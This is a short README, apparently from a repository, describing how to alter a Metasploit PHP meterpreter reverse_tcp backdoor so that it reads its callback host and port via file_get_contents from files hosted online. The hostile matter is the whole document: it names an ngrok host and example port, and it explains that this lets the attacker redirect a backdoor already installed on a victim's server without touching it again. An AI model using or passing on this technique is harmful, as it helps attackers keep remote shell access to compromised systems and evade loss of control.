# Metasploit-Payload-PHP-Backdoor-Func

metasploit payload 'php/meterpreter/reverse_tcp' file_get_content

### look at line 4 through line 11, there you see the original source code on line 6 and line 7, and replace it like line 10 and line 11.

- $ip = file_get_contents ("url");

- $port = file_get_contents ("url");

Explanation: file_get_contents is to get the contents of the URL, so we create a file:

- host.txt (contains "0.tcp.ngrok.io")

- port.txt (contains "port", for example "13337")

and the file, uploaded to Hosting or Online storage.

### Why use file_get_contents?
Because, when the backdoor is installed and used in the target victim, we cannot change the IP: Port, when Port Forwarding is down or experiencing problems, we only need to change the contents of the file host.txt and port.txt in Hosting or Online Storage, and backdoor in the target victim will read the new contents of the file, and therefore we can make it change as we wish.


### You can read here : https://medium.com/@warifp/metasploit-ip-publik-fixed-port-dengan-ngrok-versi-gratis-fa4614934aaa
